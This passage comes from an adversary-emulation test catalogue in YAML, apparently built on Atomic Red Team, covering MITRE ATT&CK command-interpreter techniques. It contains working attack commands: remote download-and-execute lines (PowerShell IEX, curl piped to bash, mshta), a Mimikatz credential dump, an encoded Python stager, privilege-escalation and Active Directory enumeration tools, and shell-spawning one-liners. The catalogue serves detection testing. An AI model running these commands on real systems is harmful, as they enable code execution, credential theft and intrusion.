Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Invoke-AppPathBypass
      type: cmd
      platform: windows
      command: Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
      timeout: 120
      is_safe: true
    - name: Powershell MsXml COM object - with prompt
      type: cmd
      platform: windows
      command: powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
      timeout: 120
      is_safe: true
    - name: Powershell XML requests
      type: cmd
      platform: windows
      command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml'');$Xml.command.a.execute | IEX"'
      timeout: 120
      is_safe: true
    - name: Powershell invoke mshta.exe download
      type: cmd
      platform: windows
      command: C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
      timeout: 120
      is_safe: true
    - name: PowerShell Fileless Script Execution
      type: powershell
      platform: windows
      command: |-
        # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
        reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
        iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
      cleanup: |-
        Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
        Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: NTFS Alternate Data Stream Access
      type: powershell
      platform: windows
      command: |-
        Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
        $streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
        Invoke-Expression $streamcommand
      cleanup: Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: PowerShell Session Creation and Use
      type: powershell
      platform: windows
      command: |-
        New-PSSession -ComputerName $env:COMPUTERNAME
        Test-Connection $env:COMPUTERNAME
        Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
        Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
        Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: ATHPowerShellCommandLineParameter -Command parameter variations
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop
      timeout: 120
      is_safe: true
    - name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop
      timeout: 120
      is_safe: true
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop
      timeout: 120
      is_safe: true
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop
      timeout: 120
      is_safe: true
    - name: PowerShell Command Execution
      type: cmd
      platform: windows
      command: powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
      timeout: 120
      is_safe: true
    - name: PowerShell Invoke Known Malicious Cmdlets
      type: powershell
      platform: windows
      command: |-
        $malcmdlets = "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"

        foreach ($cmdlets in $malcmdlets) {
            "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
        foreach ($cmdlets in $malcmdlets) {
            $cmdlets}
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: PowerUp Invoke-AllChecks
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
        Invoke-AllChecks
      timeout: 120
      is_safe: true
    - name: Abuse Nslookup with DNS Records
      type: powershell
      platform: windows
      command: |-
        # creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
        # this would not be part of a real attack but helpful for this simulation
        function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
        powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
      timeout: 120
      is_safe: true
    - name: SOAPHound - Dump BloodHound Data
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2
      timeout: 120
      is_safe: true
    - name: SOAPHound - Build Cache
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/001
  is_safe: true
- id: T1059.002
  name: AppleScript
  description: |-
    Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.[1](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

    Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.[2](https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/)

    AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

    Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.[3](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).[4](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/)
  tactic: execution
  platforms:
    - macos
  executors:
    - name: AppleScript
      type: sh
      platform: macos
      command: osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/002
  is_safe: true
- id: T1059.003
  name: Windows Command Shell
  description: |-
    Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).[1](https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh)

    Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

    Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Create and Execute Batch Script
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Writes text to a file and displays it.
      type: cmd
      platform: windows
      command: echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
      cleanup: del "%TEMP%\test.bin" >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Suspicious Execution via Windows Command Shell
      type: cmd
      platform: windows
      command: '%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt'
      timeout: 120
      is_safe: true
    - name: Simulate BlackByte Ransomware Print Bombing
      type: powershell
      platform: windows
      command: cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\..\ExternalPayloads\T1059_003note.txt" | out-null
      cleanup: stop-process -name wordpad -force -erroraction silentlycontinue
      timeout: 120
      is_safe: true
    - name: Command Prompt read contents from CMD file and execute
      type: cmd
      platform: windows
      command: cmd /r cmd<"PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd"
      timeout: 120
      is_safe: true
    - name: Command prompt writing script to file then executes it
      type: cmd
      platform: windows
      command: c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
      cleanup: del "AtomicTest.vbs" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1059/003
  is_safe: true
- id: T1059.004
  name: Unix Shell
  description: |-
    Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.[1](https://linux.die.net/man/1/bash)[2](https://support.apple.com/HT208050) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

    Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

    Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

    Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.
  tactic: execution
  platforms:
    - linux
    - macos
  executors:
    - name: Create and Execute Bash Shell Script
      type: sh
      platform: linux
      command: |-
        sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
        sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
        chmod +x /tmp/art.sh
        sh /tmp/art.sh
      cleanup: rm /tmp/art.sh
      timeout: 60
      is_safe: true
    - name: Create and Execute Bash Shell Script
      type: sh
      platform: macos
      command: |-
        sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
        sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
        chmod +x /tmp/art.sh
        sh /tmp/art.sh
      cleanup: rm /tmp/art.sh
      timeout: 60
      is_safe: true
    - name: Command-Line Interface
      type: sh
      platform: linux
      command: |-
        curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
        wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
      cleanup: rm /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Command-Line Interface
      type: sh
      platform: macos
      command: |-
        curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
        wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
      cleanup: rm /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Harvest SUID executable files
      type: sh
      platform: linux
      command: |-
        chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
        bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
      cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
      timeout: 60
      is_safe: true
    - name: LinEnum tool execution
      type: sh
      platform: linux
      command: |-
        chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh
        bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh
      cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/LinEnum.sh
      timeout: 60
      is_safe: true
    - name: New script file in the tmp directory
      type: sh
      platform: linux
      command: |-
        TMPFILE=$(mktemp)
        echo "id" > $TMPFILE
        bash $TMPFILE
      cleanup: |-
        rm $TMPFILE
        unset TMPFILE
      timeout: 60
      is_safe: true
    - name: What shell is running
      type: sh
      platform: linux
      command: |-
        echo $0
        if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
        if $(printenv SHELL >/dev/null); then printenv SHELL; fi
      timeout: 60
      is_safe: true
    - name: What shells are available
      type: sh
      platform: linux
      command: cat /etc/shells
      timeout: 60
      is_safe: true
    - name: Command line scripts
      type: sh
      platform: linux
      command: for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
      timeout: 60
      is_safe: true
    - name: Obfuscated command line scripts
      type: sh
      platform: linux
      command: |-
        [ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"
        ART=$(echo -n "id" | $encodecmd)
        echo "\$ART=$ART"
        echo -n "$ART" | $decodecmd |/bin/bash
        unset ART
      timeout: 60
      is_safe: true
    - name: Change login shell
      type: bash
      platform: linux
      command: |-
        [ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
        cat /etc/passwd |grep ^art
        chsh -s /bin/sh art
        cat /etc/passwd |grep ^art
      cleanup: '[ "$(uname)" = ''FreeBSD'' ] && rmuser -y art || userdel art'
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Environment variable scripts
      type: sh
      platform: linux
      command: |-
        export ART='echo "Atomic Red Team was here... T1059.004"'
        echo $ART |/bin/sh
      cleanup: unset ART
      timeout: 60
      is_safe: true
    - name: Detecting pipe-to-shell
      type: sh
      platform: linux
      command: |-
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash
        ls -la /tmp/art.txt
      cleanup: rm /tmp/art.txt
      timeout: 60
      is_safe: true
    - name: Current kernel information enumeration
      type: sh
      platform: linux
      command: uname -srm
      timeout: 60
      is_safe: true
    - name: Shell Creation using awk command
      type: sh
      platform: linux
      command: awk 'BEGIN {system("/bin/sh &")}'
      timeout: 60
      is_safe: true
    - name: Shell Creation using awk command
      type: sh
      platform: macos
      command: awk 'BEGIN {system("/bin/sh &")}'
      timeout: 60
      is_safe: true
    - name: Creating shell using cpan command
      type: sh
      platform: linux
      command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
      timeout: 60
      is_safe: true
    - name: Creating shell using cpan command
      type: sh
      platform: macos
      command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
      timeout: 60
      is_safe: true
    - name: Shell Creation using busybox command
      type: sh
      platform: linux
      command: busybox sh &
      timeout: 60
      is_safe: true
    - name: emacs spawning an interactive system shell
      type: sh
      platform: linux
      command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: emacs spawning an interactive system shell
      type: sh
      platform: macos
      command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1059/004
  is_safe: true
- id: T1059.005
  name: Visual Basic
  description: |-
    Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.[1](https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/)[2](https://docs.microsoft.com/dotnet/visual-basic/)

    Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.[3](https://docs.microsoft.com/office/vba/api/overview/)[4](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).[5](https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85))

    Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).[6](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805)
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Visual Basic script execution to gather local computer information
      type: powershell
      platform: windows
      command: cscript "PathToAtomicsFolder\T1059.005\src\sys_info.vbs" > $env:TEMP\T1059.005.out.txt
      cleanup: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Encoded VBS code execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
      cleanup: Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
      timeout: 120
      is_safe: true
    - name: Extract Memory via VBA
      type: powershell
      platform: windows
      command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
      cleanup: Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/005
  is_safe: true
- id: T1059.006
  name: Python
  description: |-
    Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.[1](https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online)

    Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Execute shell script via python's command mode arguement
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
      cleanup: "rm T1059.006-payload \npip-autoremove pypykatz >nul 2> nul"
      timeout: 60
      is_safe: true
    - name: Execute Python via scripts
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        echo 'import requests' > T1059.006.py
        echo 'import os' >> T1059.006.py
        echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
        echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
        echo 'session = requests.session()' >> T1059.006.py
        echo 'source = session.get(url).content' >> T1059.006.py
        echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
        echo 'fd.write(source)' >> T1059.006.py
        echo 'fd.close()' >> T1059.006.py
        echo 'os.system(malicious_command)' >> T1059.006.py
        $which_python T1059.006.py
      cleanup: rm T1059.006.py T1059.006-payload
      timeout: 60
      is_safe: true
    - name: Execute Python via Python executables
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        echo 'import requests' > T1059.006.py
        echo 'import os' >> T1059.006.py
        echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
        echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
        echo 'session = requests.session()' >> T1059.006.py
        echo 'source = session.get(url).content' >> T1059.006.py
        echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
        echo 'fd.write(source)' >> T1059.006.py
        echo 'fd.close()' >> T1059.006.py
        echo 'os.system(malicious_command)' >> T1059.006.py
        $which_python -c 'import py_compile; py_compile.compile("T1059.006.py", "T1059.006.pyc")'
        $which_python T1059.006.pyc
      cleanup: rm T1059.006.pyc T1059.006.py T1059.006-payload
      timeout: 60
      is_safe: true
    - name: Python pty module and spawn function used to spawn sh or bash
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        $which_python -c "import pty;pty.spawn('/bin/sh')"
        exit
        $which_python -c "import pty;pty.spawn('/bin/bash')"
        exit
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/006
  is_safe: true
- id: T1059.007
  name: JavaScript
  description: |-
    Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.[1](https://nodejs.org/)

    JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.[2](https://docs.microsoft.com/windows/win32/com/translating-to-jscript)[3](https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript)[4](https://docs.microsoft.com/scripting/winscript/windows-script-interfaces)

    JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.[5](https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html)[6](https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5)[7](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)[8](https://redcanary.com/blog/clipping-silver-sparrows-wings/)[9](https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/)

    Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: JScript execution to gather local computer information via cscript
      type: cmd
      platform: windows
      command: cscript "PathToAtomicsFolder\T1059.007\src\sys_info.js" > %tmp%\T1059.007.out.txt
      cleanup: del %tmp%\T1059.007.out.txt >nul 2>&1
      timeout: 120
      is_safe: true
    - name: JScript execution to gather local computer information via wscript
      type: cmd
      platform: windows
      command: wscript "PathToAtomicsFolder\T1059.007\src\sys_info.js"
      timeout: 120
